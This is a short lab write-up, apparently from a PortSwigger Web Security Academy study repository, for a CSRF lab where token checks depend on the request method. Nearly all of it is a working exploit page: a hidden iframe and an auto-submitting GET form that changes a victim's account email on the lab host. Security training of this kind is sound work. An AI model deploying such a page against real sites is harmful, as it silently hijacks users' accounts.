# CSRF where token validation depends on request method
- Just follow the steps from [CSRF vulnerability with no defenses
](https://github.com/p-cap/Portswigger-Academy-Mock/blob/main/CSRF/1%20-%20CSRF%20vulnerability%20with%20no%20defenses/Readme.md)
- The only difference is utilizing GET request in the action attribute of the from tag
```html
<html>
    <body>
        <h1>Hello World!</h1>    
        <!--
            iframe => An inline frame is used to embed another document within the current HTML document
            The iframe with STYLE="DISPLAY:NONE" ensures that the victim does not recognize the page being redirected

            Reference:
            HTML Iframes  
            https://www.w3schools.com/html/html_iframe.asp
         -->
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <!--
            Target attribute specifies a name or a keyword that indicates where to display the response that is received after submitting the form
            In this example,  the value of the target displays the response to a iframe
            Reference:
            HTML <form> target Attribute 
            https://www.w3schools.com/TAGs/att_form_target.asp
        -->
      
          
                                                                                                                 <!--
                                                                                                                  GET Method below
                                                                                                                  -->
        <form action="https://acb01f961f46be3ec0d009ff00960036.web-security-academy.net/my-account/change-email" method="GET" target="csrf-iframe" id="csrf-form">

          
          
          <input type="hidden" name="email" value="pcap_panwed_you_one_more_tme@pcap.com">
        </form>
        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```
